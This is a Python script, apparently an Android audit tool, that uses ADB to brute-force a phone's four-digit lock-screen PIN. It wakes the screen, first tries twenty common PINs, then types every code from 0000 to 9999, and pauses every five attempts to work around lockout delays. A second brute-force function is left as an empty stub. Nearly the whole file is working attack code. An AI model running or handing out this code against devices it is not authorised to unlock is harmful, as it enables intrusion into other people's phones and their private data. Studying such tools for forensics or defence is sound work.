#!/usr/bin/env python3
import adbutils
import time

digit_list = (
    "1234", "1111", "0000", "1212", "7777", "1004", "2000", "4444", "2222", "6969",
    "9999", "3333", "5555", "6666", "1122", "1313", "8888", "4321", "2001", "1010")

def get_connected_devices():
    """Return all connected devices
    """
    adb = adbutils.AdbClient(host="127.0.0.1", port=5037)

    return adb


def display_connected_device():
    """Display all connected devices
    """
    adb = get_connected_devices()

    for device in adb.devices():
        print(" - %s" % device.serial)


def check_device_exists(device):
    """Check if the specified device truly exists

    :param device: Device to audit
    """
    checked = False

    for element in get_connected_devices().device_list():
        if device in str(element):
            checked = True

    return checked


def show_device_info(device):
    """Display information regarding the device

    :param device: Device to audit
    """
    adb = get_connected_devices()
    d = adb.device(serial=device)

    print("[x] Getting information on %s - %s (%s)" % (device, d.prop.device, d.prop.model))


def exec_command(device, cmd):
    """Execute a specific command on the specified device

    :param device: Device to audit
    :param cmd: Commande to execute
    """
    adb = get_connected_devices()
    d = adb.device(serial=device)

    return d.shell(cmd)


def check_unlocked_screen(device):
    """Check if the screen is currently unlocked

    :param device: Device to audit
    """
    unlocked = False

    WakeBlocker = exec_command(device, "dumpsys power | grep 'mHoldingWakeLockSuspendBlocker' | cut -d'=' -f2")
    DisplayBlocker = exec_command(device, "dumpsys power | grep 'mHoldingDisplaySuspendBlocker' | cut -d'=' -f2")

    if WakeBlocker == "false" and DisplayBlocker == "true":
        unlocked = True

    return unlocked


def wake_screen(device):
    """ Wake Screen for GUI attacks
    :param device: Device to audit
    """
    if exec_command(device, "dumpsys power | grep 'Display Power' | cut -d'=' -f2") == "OFF":
        exec_command(device, "input keyevent 26")

    exec_command(device, "input keyevent 82")
    exec_command(device, "input swipe 407 1211 378 85")


def start_gui_bf(device):
    """Launch GUI bruteforce

    :param device: Device to audit
    """
    # 26 - KEYCODE_POWER
    # 66 - KEYCODE_ENTER
    # 82 - KEYCODE_MENU

    wake_screen(device)

    proc_count = 0

    for pin in digit_list:
        print("Try %s" % pin)
        exec_command(device, "input text %s" % pin)
        exec_command(device, "input keyevent 66")
        exec_command(device, "input swipe 407 1211 378 85")
        time.sleep(1)

        proc_count += 1

        if (proc_count % 5) == 0:
            print("Waiting 30 secondes")
            exec_command(device, "input keyevent 66")
            time.sleep(30)

    for i in range(0, 10000):
        pin = '{:04d}'.format(i)

        if pin in digit_list:
            continue

        exec_command(device, "input text %s" % pin)
        exec_command(device, "input keyevent 66")

        proc_count += 1

        if (proc_count % 5) == 0:
            print("Waiting 30 secondes")
            time.sleep(30)


def start_locksettings_bf(device):
    """Launch LockSettings bruteforce

    :param device: Device to audit
    """
